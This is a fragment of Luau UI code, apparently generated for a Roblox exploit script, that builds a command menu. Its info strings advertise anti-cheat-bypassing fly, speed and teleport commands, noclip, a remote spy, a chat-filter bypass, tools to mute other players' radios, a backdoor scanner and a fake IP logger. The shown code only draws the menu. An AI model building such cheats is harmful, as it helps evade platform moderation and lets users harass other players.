G2L["2d"]["TextSize"] = 14;
G2L["2d"]["TextScaled"] = true;
G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2d"]["ZIndex"] = 2147483647;
G2L["2d"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["2d"]["BackgroundTransparency"] = 1;
G2L["2d"]["Name"] = [[ >muteradio/<player name>]];
G2L["2d"]["Text"] = [[ >muteradio/<player name>]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >muteradio/<player name>.Info
G2L["2e"] = Instance.new("StringValue", G2L["2d"]);
G2L["2e"]["Name"] = [[Info]];
G2L["2e"]["Value"] = [[Command Info: Mutes someone boombox temporarily. (More info once command is used in output box)]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >loopmuteradio/<player name>
G2L["2f"] = Instance.new("TextButton", G2L["11"]);
G2L["2f"]["TextWrapped"] = true;
G2L["2f"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["2f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["2f"]["TextSize"] = 14;
G2L["2f"]["TextScaled"] = true;
G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2f"]["ZIndex"] = 2147483647;
G2L["2f"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["2f"]["BackgroundTransparency"] = 1;
G2L["2f"]["Name"] = [[ >loopmuteradio/<player name>]];
G2L["2f"]["Text"] = [[ >loopmuteradio/<player name>]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >loopmuteradio/<player name>.Info
G2L["30"] = Instance.new("StringValue", G2L["2f"]);
G2L["30"]["Name"] = [[Info]];
G2L["30"]["Value"] = [[Command Info: Loop mutes someones boombox. (extra info once executed from output box)]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unloopmuteradio
G2L["31"] = Instance.new("TextButton", G2L["11"]);
G2L["31"]["TextWrapped"] = true;
G2L["31"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["31"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["31"]["TextSize"] = 14;
G2L["31"]["TextScaled"] = true;
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["31"]["ZIndex"] = 2147483647;
G2L["31"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["31"]["BackgroundTransparency"] = 1;
G2L["31"]["Name"] = [[ >unloopmuteradio]];
G2L["31"]["Text"] = [[ >unloopmuteradio]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unloopmuteradio.Info
G2L["32"] = Instance.new("StringValue", G2L["31"]);
G2L["32"]["Name"] = [[Info]];
G2L["32"]["Value"] = [[Command Info: Turns off Loop Mute for all the people who were affected.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >glitchradio/<player name>
G2L["33"] = Instance.new("TextButton", G2L["11"]);
G2L["33"]["TextWrapped"] = true;
G2L["33"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["33"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["33"]["TextSize"] = 14;
G2L["33"]["TextScaled"] = true;
G2L["33"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["33"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["33"]["ZIndex"] = 2147483647;
G2L["33"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["33"]["BackgroundTransparency"] = 1;
G2L["33"]["Name"] = [[ >glitchradio/<player name>]];
G2L["33"]["Text"] = [[ >glitchradio/<player name>]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >glitchradio/<player name>.Info
G2L["34"] = Instance.new("StringValue", G2L["33"]);
G2L["34"]["Name"] = [[Info]];
G2L["34"]["Value"] = [[Command Info: Makes someones radio sound weird and glitchy. (extra info once executed in output box)]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >audiologs
G2L["35"] = Instance.new("TextButton", G2L["11"]);
G2L["35"]["TextWrapped"] = true;
G2L["35"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["35"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["35"]["TextSize"] = 14;
G2L["35"]["TextScaled"] = true;
G2L["35"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["35"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["35"]["ZIndex"] = 2147483647;
G2L["35"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["35"]["BackgroundTransparency"] = 1;
G2L["35"]["Name"] = [[ >audiologs]];
G2L["35"]["Text"] = [[ >audiologs]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >audiologs.Info
G2L["36"] = Instance.new("StringValue", G2L["35"]);
G2L["36"]["Name"] = [[Info]];
G2L["36"]["Value"] = [[Command Info: Executes an Audio Logger.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >bdexe
G2L["37"] = Instance.new("TextButton", G2L["11"]);
G2L["37"]["TextWrapped"] = true;
G2L["37"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["37"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["37"]["TextSize"] = 14;
G2L["37"]["TextScaled"] = true;
G2L["37"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["37"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["37"]["ZIndex"] = 2147483647;
G2L["37"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["37"]["BackgroundTransparency"] = 1;
G2L["37"]["Name"] = [[ >bdexe]];
G2L["37"]["Text"] = [[ >bdexe]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >bdexe.Info
G2L["38"] = Instance.new("StringValue", G2L["37"]);
G2L["38"]["Name"] = [[Info]];
G2L["38"]["Value"] = [[Command Info: This doesnt execute no logs version anymore since pastebin deleted my account for no reason and now I have to give normal but the logs are removed by the devs so your fine. (they were game logs anyways)]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >frakturess
G2L["39"] = Instance.new("TextButton", G2L["11"]);
G2L["39"]["TextWrapped"] = true;
G2L["39"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["39"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["39"]["TextSize"] = 14;
G2L["39"]["TextScaled"] = true;
G2L["39"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["39"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["39"]["ZIndex"] = 2147483647;
G2L["39"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["39"]["BackgroundTransparency"] = 1;
G2L["39"]["Name"] = [[ >frakturess]];
G2L["39"]["Text"] = [[ >frakturess]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >frakturess.Info
G2L["3a"] = Instance.new("StringValue", G2L["39"]);
G2L["3a"]["Name"] = [[Info]];
G2L["3a"]["Value"] = [[Command Info: Executes Frakture SS. (backdoor scanner) (idk if this is discontinued honestly)]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatbot
G2L["3b"] = Instance.new("TextButton", G2L["11"]);
G2L["3b"]["TextWrapped"] = true;
G2L["3b"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["3b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["3b"]["TextSize"] = 14;
G2L["3b"]["TextScaled"] = true;
G2L["3b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3b"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3b"]["ZIndex"] = 2147483647;
G2L["3b"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["3b"]["BackgroundTransparency"] = 1;
G2L["3b"]["Name"] = [[ >chatbot]];
G2L["3b"]["Text"] = [[ >chatbot]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatbot.Info
G2L["3c"] = Instance.new("StringValue", G2L["3b"]);
G2L["3c"]["Name"] = [[Info]];
G2L["3c"]["Value"] = [[Command Info: Use a new Chat Bot thing so it works now.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >antifling
G2L["3d"] = Instance.new("TextButton", G2L["11"]);
G2L["3d"]["TextWrapped"] = true;
G2L["3d"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["3d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["3d"]["TextSize"] = 14;
G2L["3d"]["TextScaled"] = true;
G2L["3d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3d"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3d"]["ZIndex"] = 2147483647;
G2L["3d"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["3d"]["BackgroundTransparency"] = 1;
G2L["3d"]["Name"] = [[ >antifling]];
G2L["3d"]["Text"] = [[ >antifling]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >antifling.Info
G2L["3e"] = Instance.new("StringValue", G2L["3d"]);
G2L["3e"]["Name"] = [[Info]];
G2L["3e"]["Value"] = [[Command Info: An actually good Anti Fling. it now has a command to disable and enable it: af/false, af/true (defaulted on)]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >to/<player name>
G2L["3f"] = Instance.new("TextButton", G2L["11"]);
G2L["3f"]["TextWrapped"] = true;
G2L["3f"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["3f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["3f"]["TextSize"] = 14;
G2L["3f"]["TextScaled"] = true;
G2L["3f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3f"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3f"]["ZIndex"] = 2147483647;
G2L["3f"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["3f"]["BackgroundTransparency"] = 1;
G2L["3f"]["Name"] = [[ >to/<player name>]];
G2L["3f"]["Text"] = [[ >to/<player name>]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >to/<player name>.Info
G2L["40"] = Instance.new("StringValue", G2L["3f"]);
G2L["40"]["Name"] = [[Info]];
G2L["40"]["Value"] = [[Command Info: Teleports you to a player (in a way that bypasses most anti cheats)]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fly/<speed num>
G2L["41"] = Instance.new("TextButton", G2L["11"]);
G2L["41"]["TextWrapped"] = true;
G2L["41"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["41"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["41"]["TextSize"] = 14;
G2L["41"]["TextScaled"] = true;
G2L["41"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["41"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["41"]["ZIndex"] = 2147483647;
G2L["41"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["41"]["BackgroundTransparency"] = 1;
G2L["41"]["Name"] = [[ >fly/<speed num>]];
G2L["41"]["Text"] = [[ >fly/<speed num>]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fly/<speed num>.Info
G2L["42"] = Instance.new("StringValue", G2L["41"]);
G2L["42"]["Name"] = [[Info]];
G2L["42"]["Value"] = [[Command Info: Makes you fly in a way that bypasses most anti cheats with an optional speed argument.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >noclip
G2L["43"] = Instance.new("TextButton", G2L["11"]);
G2L["43"]["TextWrapped"] = true;
G2L["43"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["43"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["43"]["TextSize"] = 14;
G2L["43"]["TextScaled"] = true;
G2L["43"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["43"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["43"]["ZIndex"] = 2147483647;
G2L["43"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["43"]["BackgroundTransparency"] = 1;
G2L["43"]["Name"] = [[ >noclip]];
G2L["43"]["Text"] = [[ >noclip]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >noclip.Info
G2L["44"] = Instance.new("StringValue", G2L["43"]);
G2L["44"]["Name"] = [[Info]];
G2L["44"]["Value"] = [[Command Info: Let's you walk through walls and stuff.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >clip
G2L["45"] = Instance.new("TextButton", G2L["11"]);
G2L["45"]["TextWrapped"] = true;
G2L["45"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["45"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["45"]["TextSize"] = 14;
G2L["45"]["TextScaled"] = true;
G2L["45"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["45"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["45"]["ZIndex"] = 2147483647;
G2L["45"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["45"]["BackgroundTransparency"] = 1;
G2L["45"]["Name"] = [[ >clip]];
G2L["45"]["Text"] = [[ >clip]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >clip.Info
G2L["46"] = Instance.new("StringValue", G2L["45"]);
G2L["46"]["Name"] = [[Info]];
G2L["46"]["Value"] = [[Command Info: Turns off noclip.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >speed/<number>
G2L["47"] = Instance.new("TextButton", G2L["11"]);
G2L["47"]["TextWrapped"] = true;
G2L["47"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["47"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["47"]["TextSize"] = 14;
G2L["47"]["TextScaled"] = true;
G2L["47"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["47"]["ZIndex"] = 2147483647;
G2L["47"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["47"]["BackgroundTransparency"] = 1;
G2L["47"]["Name"] = [[ >speed/<number>]];
G2L["47"]["Text"] = [[ >speed/<number>]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >speed/<number>.Info
G2L["48"] = Instance.new("StringValue", G2L["47"]);
G2L["48"]["Name"] = [[Info]];
G2L["48"]["Value"] = [[Command Info: Let's you walk fast in a way that bypasses most anti cheats.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unspeed
G2L["49"] = Instance.new("TextButton", G2L["11"]);
G2L["49"]["TextWrapped"] = true;
G2L["49"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["49"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["49"]["TextSize"] = 14;
G2L["49"]["TextScaled"] = true;
G2L["49"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["49"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["49"]["ZIndex"] = 2147483647;
G2L["49"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["49"]["BackgroundTransparency"] = 1;
G2L["49"]["Name"] = [[ >unspeed]];
G2L["49"]["Text"] = [[ >unspeed]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unspeed.Info
G2L["4a"] = Instance.new("StringValue", G2L["49"]);
G2L["4a"]["Name"] = [[Info]];
G2L["4a"]["Value"] = [[Command Info: turns off speed (because it can't be stopped normally)]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >remotespy
G2L["4b"] = Instance.new("TextButton", G2L["11"]);
G2L["4b"]["TextWrapped"] = true;
G2L["4b"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["4b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["4b"]["TextSize"] = 14;
G2L["4b"]["TextScaled"] = true;
G2L["4b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4b"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4b"]["ZIndex"] = 2147483647;
G2L["4b"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["4b"]["BackgroundTransparency"] = 1;
G2L["4b"]["Name"] = [[ >remotespy]];
G2L["4b"]["Text"] = [[ >remotespy]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >remotespy.Info
G2L["4c"] = Instance.new("StringValue", G2L["4b"]);
G2L["4c"]["Name"] = [[Info]];
G2L["4c"]["Value"] = [[Command Info: Let's you see some remote event stuff]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatbypass
G2L["4d"] = Instance.new("TextButton", G2L["11"]);
G2L["4d"]["TextWrapped"] = true;
G2L["4d"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["4d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["4d"]["TextSize"] = 14;
G2L["4d"]["TextScaled"] = true;
G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4d"]["ZIndex"] = 2147483647;
G2L["4d"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["4d"]["BackgroundTransparency"] = 1;
G2L["4d"]["Name"] = [[ >chatbypass]];
G2L["4d"]["Text"] = [[ >chatbypass]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatbypass.Info
G2L["4e"] = Instance.new("StringValue", G2L["4d"]);
G2L["4e"]["Name"] = [[Info]];
G2L["4e"]["Value"] = [[Command Info: Best competitor to BetterBypasser added since BetterBypasser has a key system and this doesn't and this one also has realistic looking text.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >collisions
G2L["4f"] = Instance.new("TextButton", G2L["11"]);
G2L["4f"]["TextWrapped"] = true;
G2L["4f"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["4f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["4f"]["TextSize"] = 14;
G2L["4f"]["TextScaled"] = true;
G2L["4f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4f"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4f"]["ZIndex"] = 2147483647;
G2L["4f"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["4f"]["BackgroundTransparency"] = 1;
G2L["4f"]["Name"] = [[ >collisions]];
G2L["4f"]["Text"] = [[ >collisions]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >collisions.Info
G2L["50"] = Instance.new("StringValue", G2L["4f"]);
G2L["50"]["Name"] = [[Info]];
G2L["50"]["Value"] = [[Command Info: Makes you able to walk on people in non collision games. (Fling scripts don't work though.)]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >iplog
G2L["51"] = Instance.new("TextButton", G2L["11"]);
G2L["51"]["TextWrapped"] = true;
G2L["51"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["51"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["51"]["TextSize"] = 14;
G2L["51"]["TextScaled"] = true;
G2L["51"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["51"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["51"]["ZIndex"] = 2147483647;
G2L["51"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["51"]["BackgroundTransparency"] = 1;
G2L["51"]["Name"] = [[ >iplog]];
G2L["51"]["Text"] = [[>iplog]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >iplog.Info
G2L["52"] = Instance.new("StringValue", G2L["51"]);
G2L["52"]["Name"] = [[Info]];
G2L["52"]["Value"] = [[Command Info: Gives you a fake ip logger gui i edited to hopefully fix the problems of it tagging]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >brookhaven
G2L["53"] = Instance.new("TextButton", G2L["11"]);
G2L["53"]["TextWrapped"] = true;
G2L["53"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["53"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["53"]["TextSize"] = 14;
G2L["53"]["TextScaled"] = true;
G2L["53"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["53"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["53"]["ZIndex"] = 2147483647;
G2L["53"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["53"]["BackgroundTransparency"] = 1;
G2L["53"]["Name"] = [[ >brookhaven]];
G2L["53"]["Text"] = [[ >brookhaven]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >brookhaven.Info
G2L["54"] = Instance.new("StringValue", G2L["53"]);
G2L["54"]["Name"] = [[Info]];
G2L["54"]["Value"] = [[Command Info: Brookhaven trolling script.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >animlogs
G2L["55"] = Instance.new("TextButton", G2L["11"]);
G2L["55"]["TextWrapped"] = true;
G2L["55"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["55"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["55"]["TextSize"] = 14;
G2L["55"]["TextScaled"] = true;
G2L["55"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["55"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["55"]["ZIndex"] = 2147483647;
G2L["55"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["55"]["BackgroundTransparency"] = 1;
G2L["55"]["Name"] = [[ >animlogs]];
G2L["55"]["Text"] = [[>animlogs]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >animlogs.Info
G2L["56"] = Instance.new("StringValue", G2L["55"]);
G2L["56"]["Name"] = [[Info]];
G2L["56"]["Value"] = [[Command Info: Gives you a cool looking gui that has stuff like logging animations, playing animations, pause animations, move through every sequence, and previewing them]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >emojichat
G2L["57"] = Instance.new("TextButton", G2L["11"]);
G2L["57"]["TextWrapped"] = true;
G2L["57"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["57"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["57"]["TextSize"] = 14;
G2L["57"]["TextScaled"] = true;
G2L["57"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["57"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["57"]["ZIndex"] = 2147483647;
